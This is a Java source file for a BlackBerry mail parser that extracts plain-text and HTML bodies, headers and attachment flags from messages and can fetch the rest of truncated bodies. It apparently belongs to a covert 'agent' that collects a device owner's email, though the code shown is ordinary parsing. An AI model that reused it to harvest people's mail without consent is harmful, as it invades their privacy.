//#preprocess
package blackberry.agent.mail;

import java.io.UnsupportedEncodingException;
import java.util.Enumeration;

import net.rim.blackberry.api.mail.Message;
import net.rim.blackberry.api.mail.MimeBodyPart;
import net.rim.blackberry.api.mail.Multipart;
import net.rim.blackberry.api.mail.SupportedAttachmentPart;
import net.rim.blackberry.api.mail.TextBodyPart;
import net.rim.blackberry.api.mail.Transport;
import net.rim.blackberry.api.mail.UnsupportedAttachmentPart;
import net.rim.blackberry.api.mail.BodyPart.ContentType;
import blackberry.Conf;
import blackberry.debug.Debug;
import blackberry.debug.DebugLevel;
import blackberry.utils.Check;

public class MailParser {
    //#ifdef DEBUG
    static Debug debug = new Debug("MailParser", DebugLevel.VERBOSE);
    //#endif

    private final Message message;
    private final Mail mail;

    public MailParser(final Message message) {
        this.message = message;
        mail = new Mail();
    }

    public final Mail parse() {
        //#ifdef DBC
        Check.requires(message != null, "parse: message != null");
        //#endif

        findEmailBody(message.getContent());

        // HACK: se si vuole si puo' fare un override del body trovato

        if (!mail.hasText()) {
            //#ifdef DEBUG_WARN
            debug.warn("Forcing bodytext");
            //#endif
            mail.plainTextMessageContentType = "text/plain; charset=UTF-8\r\n\r\n";
            mail.plainTextMessage = message.getBodyText();
        }
        return mail;
    }

    private void findEmailBody(final Object obj) {
        //Reset the attachment flags.
        mail.hasSupportedAttachment = false;
        mail.hasUnsupportedAttachment = false;
        if (obj instanceof Multipart) {
            final Multipart mp = (Multipart) obj;
            for (int count = 0; count < mp.getCount(); ++count) {
                findEmailBody(mp.getBodyPart(count));
            }
        } else if (obj instanceof TextBodyPart) {
            final TextBodyPart tbp = (TextBodyPart) obj;
            readEmailBody(tbp);
        } else if (obj instanceof MimeBodyPart) {
            final MimeBodyPart mbp = (MimeBodyPart) obj;
            if (mbp.getContentType().indexOf(ContentType.TYPE_TEXT_HTML_STRING) != -1) {
                readEmailBody(mbp);
            }

            else if (mbp.getContentType().equals(
                    ContentType.TYPE_MULTIPART_MIXED_STRING)
                    || mbp.getContentType().equals(
                            ContentType.TYPE_MULTIPART_ALTERNATIVE_STRING)) {
                //The message has attachments or we are at the top level of the message.
                //Extract all of the parts within the MimeBodyPart message.
                findEmailBody(mbp.getContent());
            }
        } else if (obj instanceof SupportedAttachmentPart) {
            mail.hasSupportedAttachment = true;
        } else if (obj instanceof UnsupportedAttachmentPart) {
            mail.hasUnsupportedAttachment = true;
        }
    }

    /**
     * MimeBodyPart text/html
     * 
     * @param mbp
     */
    private void readEmailBody(final MimeBodyPart mbp) {
        //#ifdef DEBUG_TRACE
        debug.trace("readEmailBody: MimeBodyPart");
        //#endif
        //Extract the content of the message.
        final Object obj = mbp.getContent();
        final String mimeType = mbp.getContentType();

        //String encoding = "UTF-8"; // "ISO-8859-1", "UTF-16LE" ... 
        try {
            //TODO: aggiungere automaticamente headers.
            Enumeration enumeration = mbp.getAllHeaders();
            while (enumeration.hasMoreElements()) {

                Object headerObject = enumeration.nextElement();

                if (headerObject instanceof String) {
                    String header = (String) headerObject;

                    //#ifdef DEBUG_TRACE
                    debug.trace("readEmailBody HEADER: " + header + " = "
                            + header);
                    //#endif

                } else {
                    //#ifdef DEBUG_ERROR

                    debug.error("readEmailBody HEADER: "
                            + headerObject.getClass().getName() + " tostring: "
                            + headerObject.toString());
                    //#endif
                }
            }
        } catch (Exception ex) {
            //#ifdef DEBUG_ERROR
            debug.error(ex);
            //#endif
        }

        String body = null;

        // generazione del body
        if (obj instanceof String) {
            //#ifdef DEBUG_TRACE
            debug.trace("readEmailBody: from String");
            //#endif
            body = (String) obj;
        } else if (obj instanceof byte[]) {
            //#ifdef DEBUG_TRACE
            debug.trace("readEmailBody: from byte[]");
            //#endif
            //Usare la codifica latin1 per garantire la lettura 1 byte alla volta
            try {
                body = new String((byte[]) obj, "ISO-8859-1");
            } catch (UnsupportedEncodingException e) {
                //#ifdef DEBUG_ERROR
                debug.error(e);
                //#endif
            }
        }

        if (mimeType.indexOf(ContentType.TYPE_TEXT_PLAIN_STRING) != -1) {
            mail.plainTextMessageContentType = "Content-Type: " + mimeType
                    + "\r\n\r\n";
            mail.plainTextMessage = body;
            //Determine if all of the text body part is present.
            if (mbp.hasMore() && !mbp.moreRequestSent()) {
                try {
                    //#ifdef DEBUG_INFO
                    debug.info("There's more text: " + Conf.FETCH_WHOLE_EMAIL);
                    //#endif
                    if (Conf.FETCH_WHOLE_EMAIL) {
                        Transport.more(mbp, true);
                    }
                } catch (final Exception ex) {
                    //#ifdef DEBUG_ERROR
                    debug.error("readEmailBody Mime Text: " + ex);
                    //#endif
                }
            }
        } else if (mimeType.indexOf(ContentType.TYPE_TEXT_HTML_STRING) != -1) {
            mail.htmlMessageContentType = "Content-Type: " + mimeType
                    + "\r\n\r\n";
            mail.htmlMessage = body;
            //Determine if all of the HTML body part is present.
            if (mbp.hasMore() && !mbp.moreRequestSent()) {
                try {
                    //#ifdef DEBUG_INFO
                    debug.info("There's more html: " + Conf.FETCH_WHOLE_EMAIL);
                    //#endif
                    if (Conf.FETCH_WHOLE_EMAIL) {
                        Transport.more(mbp, true);
                    }
                } catch (final Exception ex) {
                    //#ifdef DEBUG_ERROR
                    debug.error("readEmailBody Mime Html: " + ex);
                    //#endif
                }
            }
        }
    }

    /**
     * text/plain
     * 
     * @param tbp
     */
    private void readEmailBody(final TextBodyPart tbp) {
        //#ifdef DEBUG_TRACE
        debug.trace("readEmailBody: TextBodyPart");
        //#endif

        String mimeType = tbp.getContentType();
        mail.plainTextMessageContentType = "Content-Type: " + mimeType
                + "\r\n\r\n";

        if (mail.plainTextMessage == null) {
            mail.plainTextMessage = (String) tbp.getContent();
        } else {
            mail.plainTextMessage += "\r\n\r\n" + (String) tbp.getContent();
        }

        if (tbp.hasMore() && !tbp.moreRequestSent()) {
            try {
                if (Conf.FETCH_WHOLE_EMAIL) {
                    Transport.more(tbp, true);
                }
            } catch (final Exception ex) {
                //#ifdef DEBUG_ERROR
                debug.error("readEmailBody Text: " + ex);
                //#endif
            }
        }
    }
}